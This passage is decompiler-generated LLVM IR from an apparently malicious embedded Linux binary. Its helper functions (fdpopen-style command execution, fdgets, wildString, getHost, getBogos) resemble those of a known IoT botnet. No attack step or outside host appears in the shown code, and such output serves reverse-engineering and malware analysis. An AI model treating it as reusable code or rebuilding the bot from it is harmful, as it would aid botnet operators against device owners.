dec_label_pc_100012e8:                            ; preds = %dec_label_pc_100012d4, %entry
  %v1_100012ec = add i32 %tmp, 1
  %v2_100012ec = inttoptr i32 %v1_100012ec to i8*
  %v3_100012f0 = load i8, i8* %v2_100012ec, align 1
  %v3_100012f8 = icmp eq i8 %v3_100012f0, 0
  br i1 %v3_100012f8, label %dec_label_pc_1000130c, label %dec_label_pc_10001300

dec_label_pc_10001300:                            ; preds = %dec_label_pc_100012d4, %dec_label_pc_100012e8
  br label %dec_label_pc_10001530

dec_label_pc_1000130c:                            ; preds = %dec_label_pc_100012e8
  %v2_1000130c = ptrtoint i32* %stack_var_-48 to i32
  store i32 268440344, i32* @lr, align 4
  %v3_10001314 = call i32 @__GI_pipe(i32 %v2_1000130c, i32 %v1_100012ec)
  store i32 %v3_10001314, i32* @r3, align 4
  %tmp16 = icmp sgt i32 %v3_10001314, -1
  br i1 %tmp16, label %dec_label_pc_10001330, label %dec_label_pc_10001324

dec_label_pc_10001324:                            ; preds = %dec_label_pc_1000130c
  br label %dec_label_pc_10001530

dec_label_pc_10001330:                            ; preds = %dec_label_pc_1000130c
  %v3_10001334 = load i32, i32* @global_var_100285d0.14, align 4
  %v3_10001338 = icmp eq i32 %v3_10001334, 0
  br i1 %v3_10001338, label %dec_label_pc_10001340, label %dec_label_pc_100013c0

dec_label_pc_10001340:                            ; preds = %dec_label_pc_10001330
  store i32 268440388, i32* @lr, align 4
  %v1_10001340 = call i32 @getdtablesize(i32 268632064)
  %v2_10001350 = icmp sgt i32 %v1_10001340, 0
  br i1 %v2_10001350, label %dec_label_pc_10001364, label %dec_label_pc_10001358

dec_label_pc_10001358:                            ; preds = %dec_label_pc_10001340
  br label %dec_label_pc_10001530

dec_label_pc_10001364:                            ; preds = %dec_label_pc_10001340
  %v1_10001368 = mul i32 %v1_10001340, 4
  store i32 %v1_10001368, i32* @r3, align 4
  store i32 268440436, i32* @lr, align 4
  %v0_10001370 = call i32 @malloc()
  store i32 %v0_10001370, i32* @global_var_100285d0.14, align 4
  %v3_10001388 = icmp eq i32 %v0_10001370, 0
  br i1 %v3_10001388, label %dec_label_pc_10001390, label %dec_label_pc_1000139c

dec_label_pc_10001390:                            ; preds = %dec_label_pc_10001364
  br label %dec_label_pc_10001530

dec_label_pc_1000139c:                            ; preds = %dec_label_pc_10001364
  store i32 ptrtoint (i32* @global_var_100013c0.15 to i32), i32* @lr, align 4
  %v3_100013bc = call i32 @__GI_memset(i32 %v0_10001370, i32 0, i32 %v1_10001368)
  store i32 %v3_100013bc, i32* @r3, align 4
  br label %dec_label_pc_100013c0

dec_label_pc_100013c0:                            ; preds = %dec_label_pc_10001330, %dec_label_pc_1000139c
  store i32 268440516, i32* @lr, align 4
  %v0_100013c0 = call i32 @__vfork()
  %v4_100013dc = icmp eq i32 %v0_100013c0, -1
  br i1 %v4_100013dc, label %dec_label_pc_100013f4, label %dec_label_pc_100013e4

dec_label_pc_100013e4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013e8 = icmp eq i32 %v0_100013c0, 0
  br i1 %v3_100013e8, label %dec_label_pc_10001418, label %dec_label_pc_100014c8

dec_label_pc_100013f4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013f4 = load i32, i32* %stack_var_-48, align 4
  store i32 268440576, i32* @lr, align 4
  %v1_100013fc = call i32 @__libc_close(i32 %v3_100013f4)
  store i32 ptrtoint (i32* @global_var_1000140c.16 to i32), i32* @lr, align 4
  %v1_10001408 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_10001530

dec_label_pc_10001418:                            ; preds = %dec_label_pc_100013e4
  %v3_1000141c = load i8, i8* %arg2, align 1
  %v3_10001424 = icmp eq i8 %v3_1000141c, 114
  br i1 %v3_10001424, label %dec_label_pc_1000142c, label %dec_label_pc_10001464

dec_label_pc_1000142c:                            ; preds = %dec_label_pc_10001418
  %v3_10001430 = icmp eq i32 %tmp4, 1
  br i1 %v3_10001430, label %dec_label_pc_10001454, label %dec_label_pc_10001438

dec_label_pc_10001438:                            ; preds = %dec_label_pc_1000142c
  store i32 268440648, i32* @lr, align 4
  %v4_10001444 = call i32 @dup2(i32 %tmp4, i32 1, i32 %tmp)
  store i32 268440660, i32* @lr, align 4
  %v1_10001450 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_10001454

dec_label_pc_10001454:                            ; preds = %dec_label_pc_1000142c, %dec_label_pc_10001438
  %v3_10001454 = load i32, i32* %stack_var_-48, align 4
  store i32 ptrtoint (i32* @global_var_10001460.17 to i32), i32* @lr, align 4
  %v1_1000145c = call i32 @__libc_close(i32 %v3_10001454)
  br label %dec_label_pc_10001498

dec_label_pc_10001464:                            ; preds = %dec_label_pc_10001418
  %v3_10001464 = load i32, i32* %stack_var_-48, align 4
  %v3_10001468 = icmp eq i32 %v3_10001464, 0
  br i1 %v3_10001468, label %dec_label_pc_1000148c, label %dec_label_pc_10001470

dec_label_pc_10001470:                            ; preds = %dec_label_pc_10001464
  store i32 268440704, i32* @lr, align 4
  %v4_1000147c = call i32 @dup2(i32 %v3_10001464, i32 0, i32 %tmp)
  %v3_10001480 = load i32, i32* %stack_var_-48, align 4
  store i32 268440716, i32* @lr, align 4
  %v1_10001488 = call i32 @__libc_close(i32 %v3_10001480)
  br label %dec_label_pc_1000148c

dec_label_pc_1000148c:                            ; preds = %dec_label_pc_10001464, %dec_label_pc_10001470
  store i32 268440728, i32* @lr, align 4
  %v1_10001494 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_10001498

dec_label_pc_10001498:                            ; preds = %dec_label_pc_10001454, %dec_label_pc_1000148c
  %v8_100014bc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_10014cac.18 to i32), i32 ptrtoint ([3 x i8]* @global_var_100148f0.19 to i32), i32 ptrtoint ([3 x i8]* @global_var_10014cb4.20 to i32), i32 %arg1, i32 0)
  %v1_100014c4 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_100014c8

dec_label_pc_100014c8:                            ; preds = %dec_label_pc_100013e4, %dec_label_pc_10001498
  %v2_100014cc = load i8, i8* %arg2, align 1
  %v3_100014d4 = icmp eq i8 %v2_100014cc, 114
  %v3_100014dc = load i32, i32* %stack_var_-48, align 4
  br i1 %v3_100014d4, label %dec_label_pc_100014dc, label %dec_label_pc_100014f4

dec_label_pc_100014dc:                            ; preds = %dec_label_pc_100014c8
  store i32 ptrtoint (i32* @global_var_100014f0.22 to i32), i32* @lr, align 4
  %v1_100014ec = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_10001508

dec_label_pc_100014f4:                            ; preds = %dec_label_pc_100014c8
  store i32 268440840, i32* @lr, align 4
  %v1_10001504 = call i32 @__libc_close(i32 %v3_100014dc)
  br label %dec_label_pc_10001508

dec_label_pc_10001508:                            ; preds = %dec_label_pc_100014dc, %dec_label_pc_100014f4
  %stack_var_-36.0 = phi i32 [ %v3_100014dc, %dec_label_pc_100014dc ], [ %tmp4, %dec_label_pc_100014f4 ]
  %v1_1000150c = mul i32 %stack_var_-36.0, 4
  %v3_10001518 = load i32, i32* @global_var_100285d0.14, align 4
  %v2_1000151c = add i32 %v3_10001518, %v1_1000150c
  %v2_10001524 = inttoptr i32 %v2_1000151c to i32*
  store i32 %v0_100013c0, i32* %v2_10001524, align 4
  br label %dec_label_pc_10001530

dec_label_pc_10001530:                            ; preds = %dec_label_pc_100013f4, %dec_label_pc_10001390, %dec_label_pc_10001358, %dec_label_pc_10001324, %dec_label_pc_10001300, %dec_label_pc_10001508
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_10001390 ], [ -1, %dec_label_pc_100013f4 ], [ %stack_var_-36.0, %dec_label_pc_10001508 ], [ -1, %dec_label_pc_10001358 ], [ -1, %dec_label_pc_10001324 ], [ -1, %dec_label_pc_10001300 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32 %v3_100014dc, { 1, 0 }
  uselistorder i32 %v1_10001368, { 1, 0 }
  uselistorder i32 %tmp4, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10001530, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10001508, { 1, 0 }
  uselistorder label %dec_label_pc_100014c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001498, { 1, 0 }
  uselistorder label %dec_label_pc_1000148c, { 1, 0 }
  uselistorder label %dec_label_pc_10001454, { 1, 0 }
  uselistorder label %dec_label_pc_100013c0, { 1, 0 }
  uselistorder label %dec_label_pc_10001300, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-308 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v3_1000156c = load i32, i32* @global_var_100285d0.14, align 4
  %v3_10001570 = icmp eq i32 %v3_1000156c, 0
  br i1 %v3_10001570, label %dec_label_pc_1000159c, label %dec_label_pc_10001578

dec_label_pc_10001578:                            ; preds = %entry
  %v1_1000157c = mul i32 %arg1, 4
  %v2_1000158c = add i32 %v3_1000156c, %v1_1000157c
  %v1_10001590 = inttoptr i32 %v2_1000158c to i32*
  %v2_10001590 = load i32, i32* %v1_10001590, align 4
  %v3_10001594 = icmp eq i32 %v2_10001590, 0
  br i1 %v3_10001594, label %dec_label_pc_1000159c, label %dec_label_pc_100015a8

dec_label_pc_1000159c:                            ; preds = %dec_label_pc_10001578, %entry
  br label %dec_label_pc_100016d0

dec_label_pc_100015a8:                            ; preds = %dec_label_pc_10001578
  store i32 268441008, i32* @lr, align 4
  %v1_100015ac = call i32 @__libc_close(i32 %arg1)
  %v2_100015b0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268441020, i32* @lr, align 4
  %v1_100015b8 = call i32 @sigemptyset(i32 %v2_100015b0)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441036, i32* @lr, align 4
  %v2_100015c8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 2)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441052, i32* @lr, align 4
  %v2_100015d8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 3)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441068, i32* @lr, align 4
  %v2_100015e8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 1)
  %v2_100015f0 = ptrtoint i32* %stack_var_-308 to i32
  store i32 268441092, i32* @lr, align 4
  %v3_10001600 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_100015b0, i32 %v2_100015f0)
  %v2_10001620 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_10001604

dec_label_pc_10001604:                            ; preds = %dec_label_pc_1000164c, %dec_label_pc_100015a8
  %v3_10001614 = load i32, i32* @global_var_100285d0.14, align 4
  %v2_10001618 = add i32 %v3_10001614, %v1_1000157c
  %v1_1000161c = inttoptr i32 %v2_10001618 to i32*
  %v2_1000161c = load i32, i32* %v1_1000161c, align 4
  store i32 268441140, i32* @lr, align 4
  %v3_10001630 = call i32 @__libc_waitpid(i32 %v2_1000161c, i32 %v2_10001620, i32 0)
  %v4_10001644 = icmp eq i32 %v3_10001630, -1
  br i1 %v4_10001644, label %dec_label_pc_1000164c, label %dec_label_pc_10001660

dec_label_pc_1000164c:                            ; preds = %dec_label_pc_10001604
  %v0_1000164c = call i32 @__errno_location()
  %v1_10001654 = inttoptr i32 %v0_1000164c to i32*
  %v2_10001654 = load i32, i32* %v1_10001654, align 4
  %v3_10001658 = icmp eq i32 %v2_10001654, 4
  br i1 %v3_10001658, label %dec_label_pc_10001604, label %dec_label_pc_10001660

dec_label_pc_10001660:                            ; preds = %dec_label_pc_10001604, %dec_label_pc_1000164c
  %v4_10001644.lcssa = phi i1 [ false, %dec_label_pc_10001604 ], [ true, %dec_label_pc_1000164c ]
  store i32 268441204, i32* @lr, align 4
  %v3_10001670 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_100015f0, i32 0)
  %v1_10001678 = mul i32 %tmp5, 4
  %v3_10001684 = load i32, i32* @global_var_100285d0.14, align 4
  %v2_10001688 = add i32 %v3_10001684, %v1_10001678
  %v2_10001690 = inttoptr i32 %v2_10001688 to i32*
  store i32 0, i32* %v2_10001690, align 4
  br i1 %v4_10001644.lcssa, label %dec_label_pc_100016c8, label %dec_label_pc_100016a4

dec_label_pc_100016a4:                            ; preds = %dec_label_pc_10001660
  %v3_100016a4 = load i32, i32* %stack_var_-52, align 4
  %v1_100016b0 = call i32 @__asm_rlwinm(i32 %v3_100016a4, i32 0, i32 16, i32 23)
  %v4_100016b4 = sdiv i32 %v1_100016b0, 256
  br label %dec_label_pc_100016c8

dec_label_pc_100016c8:                            ; preds = %dec_label_pc_10001660, %dec_label_pc_100016a4
  %storemerge2 = phi i32 [ %v4_100016b4, %dec_label_pc_100016a4 ], [ -1, %dec_label_pc_10001660 ]
  br label %dec_label_pc_100016d0

dec_label_pc_100016d0:                            ; preds = %dec_label_pc_1000159c, %dec_label_pc_100016c8
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_100016c8 ], [ -1, %dec_label_pc_1000159c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_100015b0, { 0, 2, 1, 4, 3, 6, 5, 7 }
  uselistorder i32 %v1_1000157c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100016d0, { 1, 0 }
  uselistorder label %dec_label_pc_100016c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001660, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_10001764

dec_label_pc_10001724:                            ; preds = %dec_label_pc_10001774
  store i32 268441412, i32* @lr, align 4
  %v1_10001740 = call i32 @__libc_read(i32 %arg3)
  %v1_10001750 = add nuw i32 %storemerge25, 1
  %v3_1000175c = icmp eq i32 %v1_10001740, 1
  br i1 %v3_1000175c, label %dec_label_pc_10001764, label %dec_label_pc_10001798

dec_label_pc_10001764:                            ; preds = %entry, %dec_label_pc_10001724
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_10001750, %dec_label_pc_10001724 ]
  %v2_1000176c = icmp slt i32 %storemerge25, %arg2
  br i1 %v2_1000176c, label %dec_label_pc_10001774, label %dec_label_pc_10001798

dec_label_pc_10001774:                            ; preds = %dec_label_pc_10001764
  %v2_10001780 = add i32 %storemerge25, %arg1
  %v1_10001784 = add i32 %v2_10001780, -1
  %v1_10001788 = inttoptr i32 %v1_10001784 to i8*
  %v2_10001788 = load i8, i8* %v1_10001788, align 1
  %v3_10001790 = icmp eq i8 %v2_10001788, 10
  br i1 %v3_10001790, label %dec_label_pc_10001798, label %dec_label_pc_10001724

dec_label_pc_10001798:                            ; preds = %dec_label_pc_10001774, %dec_label_pc_10001764, %dec_label_pc_10001724
  %stack_var_-36.0.lcssa = phi i32 [ 1, %dec_label_pc_10001774 ], [ 1, %dec_label_pc_10001764 ], [ %v1_10001740, %dec_label_pc_10001724 ]
  %v3_1000179c = icmp eq i32 %stack_var_-36.0.lcssa, 0
  %storemerge = select i1 %v3_1000179c, i32 0, i32 %arg1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10001740, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001764, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_100018343 = load i8, i8* %arg1, align 1
  %v3_1000183c6 = icmp eq i8 %v2_100018343, 0
  br i1 %v3_1000183c6, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_100017f4:                            ; preds = %dec_label_pc_10001844
  %v1_100017f8 = mul i32 %stack_var_-40.07, 16
  %v2_10001800 = load i8, i8* %stack_var_-24.08, align 1
  %v3_10001800 = zext i8 %v2_10001800 to i32
  %v1_10001810 = mul nuw nsw i32 %v3_10001800, 4
  %v2_10001814 = add i32 %v1_10001810, ptrtoint (i32* @global_var_10014cb8.23 to i32)
  %v1_10001818 = inttoptr i32 %v2_10001814 to i32*
  %v2_10001818 = load i32, i32* %v1_10001818, align 4
  %v2_1000181c = or i32 %v2_10001818, %v1_100017f8
  %v1_10001828 = add i32 %v4_100018309, 1
  %v5_1000182c = inttoptr i32 %v1_10001828 to i8*
  %v2_10001834 = load i8, i8* %v5_1000182c, align 1
  %v3_1000183c = icmp eq i8 %v2_10001834, 0
  br i1 %v3_1000183c, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_10001844:                            ; preds = %entry, %dec_label_pc_100017f4
  %v4_100018309 = phi i32 [ %v1_10001828, %dec_label_pc_100017f4 ], [ %tmp, %entry ]
  %stack_var_-24.08 = phi i8* [ %v5_1000182c, %dec_label_pc_100017f4 ], [ %arg1, %entry ]
  %stack_var_-40.07 = phi i32 [ %v2_1000181c, %dec_label_pc_100017f4 ], [ 0, %entry ]
  %tmp17 = icmp sgt i32 %stack_var_-40.07, -1
  br i1 %tmp17, label %dec_label_pc_100017f4, label %dec_label_pc_10001850

dec_label_pc_10001850:                            ; preds = %dec_label_pc_100017f4, %dec_label_pc_10001844, %entry
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v2_1000181c, %dec_label_pc_100017f4 ], [ %stack_var_-40.07, %dec_label_pc_10001844 ]
  ret i32 %stack_var_-40.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-40.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001850, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001844, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %v2_1000188c = load i8, i8* %arg1, align 1
  %v3_1000189c = icmp eq i8 %v2_1000188c, 42
  br i1 %v3_1000189c, label %dec_label_pc_100018d4, label %dec_label_pc_100018a4

dec_label_pc_100018a4:                            ; preds = %entry
  %v3_100018a8 = icmp eq i8 %v2_1000188c, 63
  br i1 %v3_100018a8, label %dec_label_pc_10001948, label %dec_label_pc_100018b0

dec_label_pc_100018b0:                            ; preds = %dec_label_pc_100018a4
  %v3_100018b4 = icmp eq i8 %v2_1000188c, 0
  br i1 %v3_100018b4, label %dec_label_pc_100018c0, label %dec_label_pc_100019a4

dec_label_pc_100018c0:                            ; preds = %dec_label_pc_100018b0
  %v2_100018c4 = load i8, i8* %tmp, align 1
  %v3_100018c4 = zext i8 %v2_100018c4 to i32
  br label %dec_label_pc_10001a28

dec_label_pc_100018d4:                            ; preds = %entry
  %v2_100018d8 = add i32 %tmp8, 1
  store i32 268441832, i32* @lr, align 4
  %v5_100018e4 = inttoptr i32 %v2_100018d8 to i8*
  %v6_100018e4 = call i32 @wildString(i8* %v5_100018e4, i32 %arg2, i32 %tmp8)
  %v3_100018ec = icmp eq i32 %v6_100018e4, 0
  br i1 %v3_100018ec, label %dec_label_pc_10001934, label %dec_label_pc_100018f4

dec_label_pc_100018f4:                            ; preds = %dec_label_pc_100018d4
  %v2_100018f8 = load i8, i8* %tmp, align 1
  %v3_10001900 = icmp eq i8 %v2_100018f8, 0
  br i1 %v3_10001900, label %dec_label_pc_1000193c, label %dec_label_pc_10001908

dec_label_pc_10001908:                            ; preds = %dec_label_pc_100018f4
  %v2_1000190c = add i32 %arg2, 1
  store i32 268441884, i32* @lr, align 4
  %v6_10001918 = call i32 @wildString(i8* nonnull %arg1, i32 %v2_1000190c, i32 %arg2)
  %v3_10001920 = icmp eq i32 %v6_10001918, 0
  br i1 %v3_10001920, label %dec_label_pc_10001934, label %dec_label_pc_1000193c

dec_label_pc_10001934:                            ; preds = %dec_label_pc_10001908, %dec_label_pc_100018d4
  br label %dec_label_pc_1000193c

dec_label_pc_1000193c:                            ; preds = %dec_label_pc_100018f4, %dec_label_pc_10001908, %dec_label_pc_10001934
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10001934 ], [ 1, %dec_label_pc_10001908 ], [ 1, %dec_label_pc_100018f4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001948:                            ; preds = %dec_label_pc_100018a4
  %v2_1000194c = load i8, i8* %tmp, align 1
  %v3_10001954 = icmp eq i8 %v2_1000194c, 0
  br i1 %v3_10001954, label %dec_label_pc_10001998, label %dec_label_pc_1000195c

dec_label_pc_1000195c:                            ; preds = %dec_label_pc_10001948
  %v1_10001960 = add i32 %tmp8, 1
  %v2_10001968 = add i32 %arg2, 1
  store i32 268441976, i32* @lr, align 4
  %v4_10001974 = inttoptr i32 %v1_10001960 to i8*
  %v5_10001974 = call i32 @wildString(i8* %v4_10001974, i32 %v2_10001968, i32 %arg2)
  %v3_1000197c = icmp ne i32 %v5_10001974, 0
  %. = zext i1 %v3_1000197c to i32
  br label %dec_label_pc_10001998

dec_label_pc_10001998:                            ; preds = %dec_label_pc_1000195c, %dec_label_pc_10001948
  %storemerge2 = phi i32 [ 1, %dec_label_pc_10001948 ], [ %., %dec_label_pc_1000195c ]
  br label %dec_label_pc_10001a28

dec_label_pc_100019a4:                            ; preds = %dec_label_pc_100018b0
  %v3_100019a8 = load i8, i8* %arg1, align 1
  %v4_100019a8 = zext i8 %v3_100019a8 to i32
  store i32 268442044, i32* @lr, align 4
  %v3_100019b8 = call i32 @__GI_toupper(i32 %v4_100019a8, i32 %tmp8)
  %v3_100019c4 = load i8, i8* %tmp, align 1
  %v4_100019c4 = zext i8 %v3_100019c4 to i32
  store i32 268442072, i32* @lr, align 4
  %v3_100019d4 = call i32 @__GI_toupper(i32 %v4_100019c4, i32 %arg2)
  %v4_100019dc = icmp eq i32 %v3_100019b8, %v3_100019d4
  br i1 %v4_100019dc, label %dec_label_pc_100019e4, label %dec_label_pc_10001a20

dec_label_pc_100019e4:                            ; preds = %dec_label_pc_100019a4
  %v1_100019e8 = add i32 %tmp8, 1
  %v2_100019f0 = add i32 %arg2, 1
  store i32 268442112, i32* @lr, align 4
  %v4_100019fc = inttoptr i32 %v1_100019e8 to i8*
  %v5_100019fc = call i32 @wildString(i8* %v4_100019fc, i32 %v2_100019f0, i32 %arg2)
  %v3_10001a04 = icmp ne i32 %v5_100019fc, 0
  %.7 = zext i1 %v3_10001a04 to i32
  br label %dec_label_pc_10001a20

dec_label_pc_10001a20:                            ; preds = %dec_label_pc_100019e4, %dec_label_pc_100019a4
  %storemerge = phi i32 [ 1, %dec_label_pc_100019a4 ], [ %.7, %dec_label_pc_100019e4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001a28:                            ; preds = %dec_label_pc_10001998, %dec_label_pc_1000193c, %dec_label_pc_100018c0, %dec_label_pc_10001a20
  %stack_var_-36.0 = phi i32 [ %storemerge3, %dec_label_pc_1000193c ], [ %storemerge2, %dec_label_pc_10001998 ], [ %v3_100018c4, %dec_label_pc_100018c0 ], [ %storemerge, %dec_label_pc_10001a20 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_10001a28, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000193c, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268442228, i32* @lr, align 4
  %v1_10001a70 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_10001a70, i32* %arg2, align 4
  %v4_10001a8c = icmp eq i32 %v1_10001a70, -1
  %. = zext i1 %v4_10001a8c to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10001b1c3 = load i8, i8* %arg1, align 1
  %v3_10001b246 = icmp eq i8 %v2_10001b1c3, 0
  br i1 %v3_10001b246, label %dec_label_pc_10001b2c, label %dec_label_pc_10001ae4

dec_label_pc_10001ae4:                            ; preds = %entry, %dec_label_pc_10001ae4
  %storemerge8 = phi i8* [ %storemerge, %dec_label_pc_10001ae4 ], [ %arg1, %entry ]
  %storemerge.in7 = phi i32 [ %v1_10001b10, %dec_label_pc_10001ae4 ], [ %tmp, %entry ]
  %v3_10001ae8 = load i8, i8* %storemerge8, align 1
  %v4_10001ae8 = zext i8 %v3_10001ae8 to i32
  store i32 %v4_10001ae8, i32* %r3.global-to-local, align 4
  store i32 268442364, i32* @lr, align 4
  %v3_10001af8 = call i32 @__GI_toupper(i32 %v4_10001ae8, i32 %storemerge.in7)
  store i32 %v3_10001af8, i32* %r3.global-to-local, align 4
  %v1_10001b08 = trunc i32 %v3_10001af8 to i8
  store i8 %v1_10001b08, i8* %storemerge8, align 1
  %v1_10001b10 = add i32 %storemerge.in7, 1
  %storemerge = inttoptr i32 %v1_10001b10 to i8*
  %v2_10001b1c = load i8, i8* %storemerge, align 1
  %v3_10001b24 = icmp eq i8 %v2_10001b1c, 0
  br i1 %v3_10001b24, label %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, label %dec_label_pc_10001ae4

dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge: ; preds = %dec_label_pc_10001ae4
  %v0_10001b40.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001b2c

dec_label_pc_10001b2c:                            ; preds = %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, %entry
  %v0_10001b40 = phi i32 [ %v0_10001b40.pre, %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge ], [ %tmp, %entry ]
  ret i32 %v0_10001b40

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_10001b10, { 1, 0 }
  uselistorder i32 %storemerge.in7, { 1, 0 }
  uselistorder i8* %storemerge8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10001ae4, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  store i32 268442480, i32* @lr, align 4
  %v3_10001b6c = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_100150b8.24 to i32), i32 0)
  %v2_10001d0c = ptrtoint i32* %stack_var_-4128 to i32
  %v1_10001b84 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_10001d0c

dec_label_pc_10001b7c:                            ; preds = %dec_label_pc_10001d0c
  store i32 268442504, i32* @lr, align 4
  %v2_10001b84 = call i32 @uppercase(i8* %v1_10001b84)
  store i32 268442524, i32* @lr, align 4
  %v5_10001b98 = call i32 @strstr(i32 %v2_10001d0c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100150c8.25, i32 0, i32 0), i32 268500992)
  %v4_10001ba8 = icmp eq i32 %v5_10001b98, %v2_10001d0c
  br i1 %v4_10001ba8, label %dec_label_pc_10001bb0, label %dec_label_pc_10001cf4

dec_label_pc_10001bb0:                            ; preds = %dec_label_pc_10001b7c
  %tmp15 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_10001bcc

dec_label_pc_10001bc0:                            ; preds = %dec_label_pc_10001bf4, %dec_label_pc_10001be0, %dec_label_pc_10001bcc
  %v1_10001bc4 = add i32 %v4_10001bcc, 1
  %v5_10001bc8 = inttoptr i32 %v1_10001bc4 to i8*
  br label %dec_label_pc_10001bcc

dec_label_pc_10001bcc:                            ; preds = %dec_label_pc_10001bb0, %dec_label_pc_10001bc0
  %storemerge2 = phi i8* [ %v5_10001bc8, %dec_label_pc_10001bc0 ], [ %tmp15, %dec_label_pc_10001bb0 ]
  %v4_10001bcc = ptrtoint i8* %storemerge2 to i32
  %v2_10001bd0 = load i8, i8* %storemerge2, align 1
  %v3_10001bd8 = icmp eq i8 %v2_10001bd0, 32
  br i1 %v3_10001bd8, label %dec_label_pc_10001bc0, label %dec_label_pc_10001be0

dec_label_pc_10001be0:                            ; preds = %dec_label_pc_10001bcc
  %v2_10001be4 = load i8, i8* %storemerge2, align 1
  %v3_10001bec = icmp eq i8 %v2_10001be4, 9
  br i1 %v3_10001bec, label %dec_label_pc_10001bc0, label %dec_label_pc_10001bf4

dec_label_pc_10001bf4:                            ; preds = %dec_label_pc_10001be0
  %v2_10001bf8 = load i8, i8* %storemerge2, align 1
  %v3_10001c00 = icmp eq i8 %v2_10001bf8, 58
  br i1 %v3_10001c00, label %dec_label_pc_10001bc0, label %dec_label_pc_10001c34.preheader

dec_label_pc_10001c34.preheader:                  ; preds = %dec_label_pc_10001bf4
  %v2_10001c4c = add i32 %v4_10001bcc, -1
  br label %dec_label_pc_10001c34

dec_label_pc_10001c0c:                            ; preds = %dec_label_pc_10001c64, %dec_label_pc_10001c34
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c14 = call i32 @__GI_strlen()
  %v1_10001c28 = add i32 %v0_10001c14, %v2_10001c4c
  %v3_10001c30 = inttoptr i32 %v1_10001c28 to i8*
  store i8 0, i8* %v3_10001c30, align 1
  br label %dec_label_pc_10001c34

